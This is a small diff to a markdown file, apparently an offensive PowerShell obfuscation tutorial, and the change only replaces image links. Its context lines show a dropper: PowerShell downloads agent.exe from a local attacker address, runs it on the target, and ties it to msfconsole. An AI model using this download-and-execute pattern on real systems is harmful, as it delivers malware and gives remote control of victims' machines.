@@ -648,11 +648,11 @@ The above string can be obfuscated using **powershell special characters:** **`*
       Start-BitsTransfer -Source "http://192.168.1.71/agent.exe" -Destination "$env:tmp\\agent.exe"
       Invoke-Item "$env:tmp\\agent.exe" #<-- trigger agent execution
 
-![powershell obfuscation test.ps1](http://i.cubeupload.com/Wa81qT.jpg)
+![powershell obfuscation test.ps1](http://i66.tinypic.com/23u8ua8.jpg)
 
 - Execution of **agent.exe** in target system (auto-exec)
 
-![powershell obfuscation msfconsole](http://i.cubeupload.com/CYNBc6.jpg)
+![powershell obfuscation msfconsole](http://i63.tinypic.com/2lo6a9e.jpg)
 
 ---
 
